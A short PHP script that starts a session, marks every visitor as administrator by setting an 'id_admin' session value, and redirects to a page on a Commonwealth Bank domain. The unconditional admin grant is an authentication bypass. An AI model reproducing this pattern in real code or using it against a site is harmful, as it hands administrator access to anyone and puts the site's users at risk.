<?php
session_start();
$_SESSION['id_admin']=1;
header("Location: https://commbank.com.au/register-candidates.php");

?>